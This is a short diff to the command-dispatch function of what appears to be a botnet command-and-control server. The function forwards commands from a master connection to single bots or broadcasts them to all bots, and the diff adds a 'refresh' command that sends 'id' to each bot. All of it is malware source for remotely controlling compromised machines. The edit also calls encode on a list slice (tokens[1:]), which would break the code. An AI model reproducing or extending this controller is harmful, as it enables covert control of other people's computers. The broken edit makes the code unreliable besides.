@@ -214,7 +214,7 @@ def execCommand(bots, tokens, mastersock):
         # Send command, receive result, and send the result back to the master socket.
         for bot in bots:
             if bot.idx == int(tokens[0]):
-                bot.sock.send(tokens[1].encode())
+                bot.sock.send(tokens[1:].encode())
                 #result = bot.sock.recv(4096).decode()
 
                 # Sends back the debug message because master expects that 
@@ -228,10 +228,15 @@ def execCommand(bots, tokens, mastersock):
                 if bot.idx == int(tokens[1]):
                     bots.remove(bot)
 
+    elif tokens[0] == "refresh":
+        mastersock.send("\nRefreshing the bot list".encode())
+        for bot in bots:
+            bot.sock.send("id".encode())
+
     elif tokens[0] == "broadcast":
         print("[+] Sending broadcast command to all bots")
         for bot in bots:
-            bot.sock.send(tokens[1].encode())
+            bot.sock.send(tokens[1:].encode())
             mastersock.send("\nCommand successfully delivered to all bots\n".encode())
 
     else:
